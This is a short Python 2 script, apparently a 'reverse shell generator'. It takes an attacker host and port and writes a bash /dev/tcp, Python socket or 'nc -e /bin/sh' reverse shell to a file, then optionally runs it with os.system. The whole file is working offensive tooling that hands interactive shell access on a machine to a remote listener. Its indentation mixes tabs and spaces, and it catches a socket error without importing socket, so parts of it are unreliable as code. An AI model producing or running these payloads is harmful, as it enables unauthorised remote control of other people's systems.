
#!/bin/python
import os,sys
from time import sleep
banner="""
 |  __ \                 / ____| |        | | |  / ____|                         | |            
 | |__) |_____   _______| (___ | |__   ___| | | | |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
 |  _  // _ \ \ / |______\___ \| '_ \ / _ | | | | | |_ |/ _ | '_ \ / _ | '__/ _` | __/ _ \| '__|
 | | \ |  __/\ V /       ____) | | | |  __| | | | |__| |  __| | | |  __| | | (_| | || (_) | |   
 |_|  \_\___| \_/       |_____/|_| |_|\___|_|_|  \_____|\___|_| |_|\___|_|  \__,_|\__\___/|_|   
                                                                                                
"""                                                                                                
def choice(shell,ip,port):
	if (shell==1):
        	bash_sh(ip,port)
        elif (shell==2):
                python_sh(ip,port)
        elif (shell==3):
                nc_sh(ip,port)
def bash_sh(ip,port):
	f = open("rev.sh", "w")
	f.write("bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1")
	f.close()
	ex=raw_input("[*] Do you want to execute it? (Y/N)")
	if (ex=='Y'):
		print("[+] Start netcat : nc -lvnp "+port)
		sleep(6)
		os.system("bash rev.sh")
	else:
		print("[+] Your shell is ready")
def python_sh(ip,port):
        f = open("rev.py", "w")
        f.write('import socket,sys,subprocess,os\ntry:\n\ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\nexcept socket.error:\n\tprint("[!] Hostname could not be resolved.")\n\tsys.exit()')
        f.close()
        ex=raw_input("[*] Do you want to execute it? (Y/N)")
        if (ex=='Y'):
                print("[+] Start netcat : nc -lvnp "+port)
		sleep(6)
                os.system("python rev.py")
        else:
                print("[+] Your shell is ready")
def nc_sh(ip,port):
        f = open("nc.sh", "w")
	f.write("#!/bin/sh\n nc -e /bin/sh "+ip+" "+port)
        f.close()
        ex=raw_input("[*] Do you want to execute it? (Y/N)")
        if (ex=='Y'):
                print("[+] Start netcat : nc -lvnp "+port)
		sleep(6)
                os.system("bash nc.sh")
        else:
                print("[+] Your shell is ready")
print(banner)
try:
	print("[*] Select reverse shell type [*]\n1. Bash \n2. Python \n3. Netcat \n ")
	shell=input("Select :")
	ip=raw_input("[*] Enter LHOST: ")
	port=raw_input("[*] Enter LPORT: ")
	choice(shell,ip,port)
except KeyboardInterrupt:
	print("\n[!] Exiting program")
	sys.exit()
except	socket.error:
	print("Couldn't connect to server.")
	sys.exit()
except socket.gaierror:
	print("Hostname could not be resolved.")
	sys.exit()
